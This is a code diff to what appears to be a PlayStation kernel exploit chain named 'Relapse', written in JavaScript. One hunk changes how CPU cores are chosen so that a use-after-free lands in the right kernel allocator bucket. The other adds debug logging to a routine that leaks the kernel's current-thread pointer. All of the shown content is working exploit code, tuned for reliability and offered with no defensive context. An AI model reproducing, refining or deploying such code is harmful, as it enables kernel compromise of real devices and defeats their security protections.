@@ -282,10 +282,18 @@ function pr_select_cores() {
     throw new Error(`Relapse needs at least two CPUs (mask=0x${saved.toString(16)}) !!`);
   }
 
-  // Prefer the historical main core, but fall back to any available core.
-  const main = cores.includes(MAIN_CORE) ? MAIN_CORE : cores[0];
-  if (!pr_set_affinity(main, mask_addr)) {
-    throw new Error(`Unable to pin main thread to core ${main} !!`);
+  // WebKitty scans candidates from lowest to highest and accepts the first
+  // core whose set/readback verifies. Do not force the legacy PS4 main core:
+  // the UAF depends on main and workers sharing the right UMA bucket.
+  let main = -1;
+  for (const c of cores) {
+    if (pr_set_affinity(c, mask_addr)) {
+      main = c;
+      break;
+    }
+  }
+  if (main < 0) {
+    throw new Error(`Unable to pin Relapse main thread (mask=0x${saved.toString(16)}) !!`);
   }
   mem.free(mask_addr);
 
@@ -875,7 +883,11 @@ async function pr_leak_curthread() {
   } catch (e) {
     // AIO status from the worker is not important; the owner sample is.
   }
+  logger.debug('Relapse leak cancel returned !!');
+
   pr_reap_arm(chain);
+  logger.debug('Relapse leak reaped !!');
+
   mem.free(chain.addr);
   mem.free(ctr);
 
